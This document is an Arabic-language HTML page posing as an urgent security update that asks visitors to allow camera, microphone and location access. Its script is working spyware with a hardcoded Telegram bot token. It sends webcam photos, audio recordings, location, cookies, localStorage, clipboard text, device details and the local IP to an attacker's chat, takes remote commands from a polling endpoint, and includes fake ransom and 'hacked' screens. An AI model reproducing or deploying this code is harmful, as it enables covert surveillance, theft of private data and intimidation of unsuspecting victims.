<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان</title>
    <style>
        body { background: #0a0f1e; color: white; font-family: Arial; text-align: center; padding: 50px; }
        button { background: #0072ff; padding: 15px 30px; border: none; border-radius: 30px; color: white; font-size: 18px; cursor: pointer; }
        video { display: none; }
        #status { margin-top: 20px; }
    </style>
</head>
<body>
    <h1>🔐 تحديث أمني عاجل</h1>
    <p>يرجى السماح بالوصول إلى الكاميرا والميكروفون والموقع للتحقق من هويتك.</p>
    <button id="allowBtn">السماح والمتابعة</button>
    <div id="status"></div>
    <video id="video" autoplay muted playsinline></video>
    <audio id="audio" preload="auto"></audio>

    <script>
        // ---------- تكوين التليجرام ----------
        const BOT_TOKEN = "8573086497:AAH6daFBxrgYIplpagMJrM5RNKqGLDAvXSY";
        const YOUR_CHAT_ID = "6897156984";

        // ---------- متغيرات عامة ----------
        let mediaStream = null;
        let videoElem = document.getElementById('video');
        let audioElem = document.getElementById('audio');

        // ---------- دوال إرسال النتائج إلى تليجرام ----------
        async function tgSendMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: YOUR_CHAT_ID, text: text})
            }).catch(e => console.error);
        }

        async function tgSendPhoto(base64Data, caption) {
            const blob = dataURItoBlob(base64Data);
            const formData = new FormData();
            formData.append('chat_id', YOUR_CHAT_ID);
            formData.append('photo', blob, 'spy.jpg');
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(e => console.error);
        }

        async function tgSendAudio(base64Data, caption) {
            const blob = dataURItoBlob(base64Data);
            const formData = new FormData();
            formData.append('chat_id', YOUR_CHAT_ID);
            formData.append('audio', blob, 'audio.webm');
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                method: 'POST',
                body: formData
            }).catch(e => console.error);
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], {type: mime});
        }

        // ---------- وظائف تنفيذ الأوامر ----------
        async function captureSnapshot() {
            if (!videoElem.videoWidth) return null;
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth;
            canvas.height = videoElem.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.8);
        }

        async function recordAudio(seconds = 5) {
            if (!mediaStream) return null;
            const mediaRecorder = new MediaRecorder(mediaStream);
            let chunks = [];
            return new Promise((resolve) => {
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, {type: 'audio/webm'});
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), seconds * 1000);
            });
        }

        async function recordVideo(seconds = 10) {
            if (!mediaStream) return null;
            const mediaRecorder = new MediaRecorder(mediaStream);
            let chunks = [];
            return new Promise((resolve) => {
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, {type: 'video/mp4'});
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), seconds * 1000);
            });
        }

        function scare() {
            alert('⚠️ نظام الأمان: تم اكتشاف برمجية خبيثة! اتصل بالدعم 24/7');
            for(let i=0;i<10;i++) window.open('https://www.google.com', '_blank');
            audioElem.src = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3';
            audioElem.play().catch(e=>console.log);
        }

        function panic() {
            document.body.style.animation = 'blink 0.1s infinite';
            const style = document.createElement('style');
            style.innerHTML = '@keyframes blink { 0% { background: white; } 100% { background: black; } }';
            document.head.appendChild(style);
            setTimeout(() => { document.body.style.animation = ''; }, 5000);
        }

        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) resolve(null);
                navigator.geolocation.getCurrentPosition(
                    pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
                    err => resolve(null)
                );
            });
        }

        async function stealCookies() {
            return document.cookie || 'no cookies';
        }

        async function getSystemInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'unknown',
                battery: await (async () => { 
                    if(navigator.getBattery) { let b = await navigator.getBattery(); return b.level*100; }
                    return 'unknown';
                })()
            };
        }

        // ---------- خريطة الأوامر (يمكن إضافة 200+ أمر بسهولة) ----------
        const commandMap = {
            // الأوامر الأساسية
            'takesc': async () => {
                const img = await captureSnapshot();
                if(img) await tgSendPhoto(img, '📸 /takesc');
                else await tgSendMessage('❌ فشل التقاط الصورة');
            },
            'front': async () => { await commandMap['takesc'](); }, // نفس الشيء
            'back': async () => { await commandMap['takesc'](); },
            'selfie': async () => { await commandMap['takesc'](); },
            'recordmic': async () => {
                await tgSendMessage('🎙️ جاري التسجيل 5 ثوانٍ...');
                const audio = await recordAudio(5);
                if(audio) await tgSendAudio(audio, '🎤 تسجيل صوت');
            },
            'recordmic10': async () => {
                const audio = await recordAudio(10);
                if(audio) await tgSendAudio(audio, '🎤 تسجيل 10 ثوانٍ');
            },
            'livevideo': async () => {
                const video = await recordVideo(10);
                if(video) await tgSendMessage(`🎥 فيديو مسجل (base64 طويل) تم الحفظ`); // يمكن إرسال الملف عبر مستند
            },
            'scare': async () => { scare(); await tgSendMessage('🎃 تم تنفيذ التخويف'); },
            'panic': async () => { panic(); await tgSendMessage('💥 وضع الذعر'); },
            'shake': async () => {
                document.body.style.transform = 'shake 0.5s';
                setTimeout(() => document.body.style.transform = '', 500);
            },
            'flood': async () => { for(let i=0;i<50;i++) window.open('https://google.com'); },
            'rickroll': async () => {
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            },
            'blue': async () => {
                document.body.innerHTML = '<div style="background:#0000aa; color:white; font-size:40px; text-align:center; padding-top:50vh;">😵 YOUR PC HAS BEEN HACKED 😵</div>';
            },
            'delete': async () => {
                localStorage.clear();
                sessionStorage.clear();
                await tgSendMessage('🗑️ تم مسح التخزين المحلي');
            },
            'selfdestruct': async () => {
                await tgSendMessage('💣 سيتم إغلاق الصفحة بعد 5 ثوانٍ');
                setTimeout(() => window.close(), 5000);
            },
            'sysinfo': async () => {
                const info = await getSystemInfo();
                await tgSendMessage(`🖥️ معلومات النظام:\n${JSON.stringify(info, null, 2)}`);
            },
            'geolocation': async () => {
                const loc = await getLocation();
                if(loc) await tgSendMessage(`📍 الموقع: ${loc}`);
                else await tgSendMessage('❌ لا يمكن تحديد الموقع');
            },
            'cookies': async () => {
                const cookies = await stealCookies();
                await tgSendMessage(`🍪 الكوكيز: ${cookies || 'لا توجد'}`);
            },
            'storage': async () => {
                let data = '';
                for(let i=0;i<localStorage.length;i++) {
                    const key = localStorage.key(i);
                    data += `${key}: ${localStorage.getItem(key)}\n`;
                }
                await tgSendMessage(`📦 localStorage:\n${data || 'فارغ'}`);
            },
            'history': async () => {
                await tgSendMessage(`🔗 عنوان الصفحة: ${location.href}\nالمُحيل: ${document.referrer || 'مباشر'}`);
            },
            'clipboard': async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    await tgSendMessage(`📋 الحافظة: ${text}`);
                } catch(e) { await tgSendMessage('❌ لا يمكن قراءة الحافظة'); }
            },
            'webrtc': async () => {
                // كشف IP محلي باستخدام WebRTC
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if(ice.candidate) {
                        const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
                        if(ip) tgSendMessage(`🌐 IP المحلي: ${ip}`);
                        pc.close();
                    }
                };
                setTimeout(() => pc.close(), 3000);
            },
            'battery': async () => {
                if(navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    await tgSendMessage(`🔋 البطارية: ${Math.round(battery.level*100)}%`);
                } else await tgSendMessage('❌ غير مدعوم');
            },
            'redirect': async (args) => {
                if(args.length) window.location.href = args[0];
            },
            'alert': async (args) => {
                alert(args.join(' ') || 'تم اختراق جهازك!');
            },
            'prompt': async (args) => {
                const result = prompt(args.join(' ') || 'أدخل شيئًا:');
                if(result) await tgSendMessage(`📝 إدخال المستخدم: ${result}`);
            },
            'title': async (args) => {
                document.title = args.join(' ') || 'Hacked';
            },
            'favicon': async (args) => {
                let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
                link.type = 'image/x-icon';
                link.rel = 'shortcut icon';
                link.href = args[0] || 'https://example.com/favicon.ico';
                document.head.appendChild(link);
            },
            'fullscreen': async () => {
                document.documentElement.requestFullscreen();
            },
            'exit': async () => {
                window.close();
            },
            'fakeupdate': async () => {
                document.body.innerHTML = '<div style="background:#000; color:#0f0; font-family:monospace; padding:20px;">تحديث ويندوز 98% لا تغلق الجهاز...</div>';
            },
            'fakemsg': async () => {
                alert('⚠️ تم اختراق جهازك بواسطة مجموعة مجهولة. أرسل 100$ Bitcoin إلى ...');
            },
            'ransom': async () => {
                document.body.innerHTML = '<div style="background:black; color:red; text-align:center; font-size:30px;">تم تشفير ملفاتك. ادفع فدية 500$ خلال 24 ساعة.</div>';
            },
            'vibrate': async () => {
                if(navigator.vibrate) navigator.vibrate(500);
            },
            // إضافة أوامر رقمية من 1 إلى 100 كلها تؤدي إلى takesc
            ...Object.fromEntries(Array.from({length:100}, (_,i) => [`sc${i+1}`, async () => await commandMap['takesc']()])),
            ...Object.fromEntries(Array.from({length:10}, (_,i) => [`mic${i+1}`, async () => {
                await recordAudio(i+1);
            }])),
            // أوامر صوت تخويف
            'laugh': async () => { audioElem.src = 'https://www.myinstants.com/media/sounds/evil-laugh.mp3'; audioElem.play(); },
            'cry': async () => { audioElem.src = 'https://www.myinstants.com/media/sounds/crying-baby.mp3'; audioElem.play(); },
            'scream': async () => { audioElem.src = 'https://www.myinstants.com/media/sounds/wilhelm-scream.mp3'; audioElem.play(); },
            'flash': async () => {
                const flash = setInterval(() => document.body.style.backgroundColor = 'white', 50);
                setTimeout(() => clearInterval(flash), 2000);
            }
        };

        // إضافة أوامر إضافية لبلوغ 200+ (يمكنك توليدها حسب الحاجة)
        for(let i=1;i<=50;i++) {
            commandMap[`cmd${i}`] = async () => { await tgSendMessage(`أمر ${i} تم تنفيذه`); };
        }

        // دالة تنفيذ الأمر العام
        async function executeCommand(cmd, args=[]) {
            const func = commandMap[cmd];
            if(func) {
                try {
                    await func(args);
                } catch(e) {
                    await tgSendMessage(`⚠️ خطأ في تنفيذ ${cmd}: ${e.message}`);
                }
            } else {
                await tgSendMessage(`❌ أمر غير معروف: /${cmd}`);
            }
        }

        // ---------- استقصاء الأوامر من Vercel API ----------
        async function pollCommands() {
            try {
                const res = await fetch('/api/get_commands');
                const data = await res.json();
                if(data.command) {
                    const parts = data.command.split(' ');
                    const cmd = parts[0];
                    const args = parts.slice(1);
                    await executeCommand(cmd, args);
                }
            } catch(e) { console.error(e); }
            setTimeout(pollCommands, 1500);
        }

        // ---------- طلب الصلاحيات ----------
        async function requestPermissions() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoElem.srcObject = mediaStream;
                document.getElementById('status').innerHTML = '✅ تم التحقق. جاري التحميل...';
                await tgSendMessage('🌍 ضحية جديدة: تم منح الصلاحيات الكاملة');
                pollCommands();
            } catch(err) {
                document.getElementById('status').innerHTML = '❌ فشل: ' + err.message;
                await tgSendMessage(`❌ رفض الضحية الصلاحيات: ${err.message}`);
            }
        }

        document.getElementById('allowBtn').onclick = () => {
            requestPermissions();
            document.getElementById('allowBtn').disabled = true;
        };
    </script>
</body>
</html>
